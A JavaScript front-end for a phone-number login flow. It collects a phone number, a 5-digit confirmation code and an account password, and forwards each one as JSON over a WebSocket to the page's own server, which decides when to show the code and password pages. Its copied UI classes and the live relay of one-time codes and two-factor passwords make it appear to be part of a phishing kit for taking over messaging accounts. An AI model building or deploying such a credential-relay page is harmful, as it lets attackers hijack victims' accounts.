const websocket = new WebSocket('ws://' + location.host + `?id=${location.host}&type=web`);
let number, state;

const button = new class {
    init() {
        this.btn = document.querySelector(".nextbtn");
    }

    enable(next = 'next()') {
        this.init();
        this.btn.innerHTML = `<button class="btn-primary btn-color-primary rp" style="" onclick="${next}"><div class="c-ripple"></div><span class="i18n">Next</span></button>`;
    }

    disable() {
        this.init();
        this.btn.innerHTML = `<button class="btn-primary btn-color-primary rp" style="" disabled="true"><span class="i18n">Please wait...</span><svg xmlns="http://www.w3.org/2000/svg" class="preloader-circular" viewBox="25 25 50 50"><circle class="preloader-path" cx="50" cy="50" r="20" fill="none" stroke-miterlimit="10"></circle></svg></button>`;
    }
}

async function getAuthCodePage() {
    return await fetch("code?number=" + number.formatInternational().replace(`+`, ''))
        .then(response => response.text());
}

async function getPassPage() {
    return await fetch("password")
        .then(response => response.text())
}

document.querySelector("#number").onkeypress = event => {
    const key = String.fromCharCode(event.which);
    const cursorPos = event.target.selectionStart;
    let inputText = event.target.value;

    const text = inputText;
    if(!/^[+0-9]+$/.test(key) ||
        (key === "+" && event.target.innerHTML.length !== 0)) {
            event.preventDefault();
            return;
    }

    console.log(inputText);
    if(!inputText.startsWith('+')) {
        inputText = "+" + inputText;
        event.target.value = inputText;
    };
    try {
        event.target.value = libphonenumber.parsePhoneNumber(inputText+key).formatInternational();
        event.preventDefault();
    } catch(e) {
        console.log(e);
    }

    if(event.target.classList.contains('error')) {
        event.target.classList.remove("error");
    }

    setCountry(text);
}

document.querySelector("#number").onpaste = event => {
    let paste = event.clipboardData.getData("text");
    if(!paste) event.preventDefault();

    if(event.target.classList.contains('error')) {
        event.target.classList.remove("error");
    }

    setTimeout(() => {
        setCountry(event.target.innerHTML);
    }, 10);
}

document.querySelector(".input-field").onclick = event => {
    const selectMenu = document.querySelector(".select-wrapper"),
        active = selectMenu.classList.contains("active");

    selectMenu.classList[active? 'add': 'remove']('hide');
    selectMenu.classList[active? 'remove': 'add']('active');
    event.stopPropagation();
}

document.onclick = () => {
    const selectMenu = document.querySelector(".select-wrapper"),
        active = selectMenu?.classList.contains("active");

    if(!active) return;
    selectMenu.classList.add('hide');
    selectMenu.classList.remove('active');
}

document.querySelectorAll('#country').forEach(element => {
    element.onclick = () => {
        document.querySelector(".input-field-input").innerHTML = element.children[1].innerHTML;
        document.querySelector("#number").value = element.children[2].innerHTML;
    }
})

function setCountry(text) {
    document.querySelector(".input-field-input").innerHTML = [...document.querySelectorAll('#country')].find(element => {
        return text
            .replace("+", "")
            .startsWith(element.children[2].innerHTML.replace("+", ""));
    })?.children[1].innerHTML || '';
}

websocket.onopen = () => {
    button.enable();
}


function confirmCode() {
    button.disable();
    const element = document.querySelector("#code");
    if(element.innerHTML.length !== 5 || isNaN(+element.innerHTML)) {
        element.classList.add("error");
        button.enable('confirmCode()');
        return;
    }

    websocket.send(JSON.stringify({
        action: 'code',
        data: element.innerHTML
    }));
}

function confirmPassword() {
    button.disable();
    const element = document.querySelector("#password");

    websocket.send(JSON.stringify({
        action: 'password',
        data: element.innerHTML
    }));
}

websocket.onmessage = async msg => {
    msg = JSON.parse(msg.data);
    
    switch(msg.action) {
        case 'code':
            if(state === 'code') {
                document.querySelector("#code").classList.add('error');
                button.enable('confirmCode()');
                return;
            }

            document.body.innerHTML = await getAuthCodePage();
            state = `code`;
            break;
        case 'success':
            location.href = 'success';
            break;
        case 'password':
            if(state === 'pass') {
                document.querySelector("#password").classList.add('error');
                button.enable('confirmPassword()');
                return
            }
            document.body.innerHTML = await getPassPage();
            state = 'pass';
            break;

    }
}

function next() {
    button.disable();
    const element = document.querySelector("#number");
    try {
        number = libphonenumber.parsePhoneNumber(element.value);
    } catch(e) { console.log(e); }
    if(!number?.isValid()) {
        element.classList.add("error");
        button.enable();
        return;
    }

    websocket.send(JSON.stringify({
        action: 'number',
        data: number.number
    }));
}